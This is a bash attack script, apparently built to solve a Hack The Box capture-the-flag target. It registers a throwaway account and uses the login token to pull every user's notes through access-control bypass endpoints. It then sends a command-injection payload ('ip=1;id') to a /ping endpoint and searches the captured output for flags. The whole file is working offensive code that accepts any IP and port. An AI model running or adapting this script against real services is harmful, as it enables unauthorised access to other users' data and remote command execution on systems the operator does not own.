#!/usr/bin/env bash
set -euo pipefail
IP=${1:?usage: IP PORT}
PORT=${2:?usage: IP PORT}
TO=${3:-8}
BASE_OUT=${4:-/workspace/recon/httpx}
OUT_DIR="$BASE_OUT/${IP}_${PORT}"
mkdir -p "$OUT_DIR"
API_BASE="http://$IP:$PORT"
# 1) Probe index and /ping
curl -fsS -m "$TO" --connect-timeout "$TO" -i "$API_BASE/" > "$OUT_DIR/index.head" || true
curl -fsS -m "$TO" --connect-timeout "$TO" -i "$API_BASE/ping" > "$OUT_DIR/ping.head" || true
# 2) Register + Login
EPOCH=$(date +%s)
EMAIL="a${EPOCH}@a.com"
PASS="Passw0rd!"
printf '%s' "$EMAIL" > "$OUT_DIR/email.txt"
jq -n --arg email "$EMAIL" --arg password "$PASS" '{email:$email,password:$password}' > "$OUT_DIR/creds.json"
curl -fsS -m 12 --connect-timeout 8 -H 'Content-Type: application/json' -d @"$OUT_DIR/creds.json" "$API_BASE/api/auth/register" > "$OUT_DIR/register.json" || true
curl -fsS -m 12 --connect-timeout 8 -H 'Content-Type: application/json' -d @"$OUT_DIR/creds.json" "$API_BASE/api/auth/login" > "$OUT_DIR/login.json"
TOKEN=$(jq -r .token "$OUT_DIR/login.json")
printf '%s' "$TOKEN" > "$OUT_DIR/token.txt"
# 3) Verify token
curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" "$API_BASE/api/auth/verify" > "$OUT_DIR/verify.json" || true
# 4) Notes endpoints
curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" "$API_BASE/api/notes" > "$OUT_DIR/notes_user.json" || true
curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" --path-as-is "$API_BASE/api/notes?all=1" -i > "$OUT_DIR/notes_all1.head" || true
curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" "$API_BASE/api/notes/all" -i > "$OUT_DIR/notes_all.head" || true
# Extract body from 200 heads if any
extract_body(){ awk 'f{print} /^$/{f=1}' "$1"; }
if grep -q "^HTTP/1\.[01] 200" "$OUT_DIR/notes_all1.head" 2>/dev/null; then extract_body "$OUT_DIR/notes_all1.head" > "$OUT_DIR/notes_all.json"; fi
if [[ ! -s "$OUT_DIR/notes_all.json" ]] && grep -q "^HTTP/1\.[01] 200" "$OUT_DIR/notes_all.head" 2>/dev/null; then extract_body "$OUT_DIR/notes_all.head" > "$OUT_DIR/notes_all.json"; fi
# 5) Decide list json
LIST_JSON=""
if [[ -s "$OUT_DIR/notes_all.json" ]]; then LIST_JSON="$OUT_DIR/notes_all.json"; fi
if [[ -z "$LIST_JSON" && -s "$OUT_DIR/notes_user.json" ]]; then LIST_JSON="$OUT_DIR/notes_user.json"; fi
# 6) Fetch individual notes
if [[ -n "$LIST_JSON" ]] && jq -e '.notes|type=="array"' "$LIST_JSON" >/dev/null 2>&1; then
  jq -r '.notes[].id' "$LIST_JSON" > "$OUT_DIR/note_ids.txt"
  while read -r nid; do
    [[ -z "$nid" ]] && continue
    curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" "$API_BASE/api/notes/$nid" > "$OUT_DIR/note_${nid}.json" || true
  done < "$OUT_DIR/note_ids.txt"
fi
# 7) Attempt RCE injection on /ping
curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode 'ip=1;id' "$API_BASE/ping" > "$OUT_DIR/ping_inj.txt" || true
# 8) Search for HTB flag in outputs
rg -n "HTB\{[^}]+\}" -S "$OUT_DIR" > "$OUT_DIR/htb_hits.txt" || true
sed -n '1,200p' "$OUT_DIR/htb_hits.txt" || true
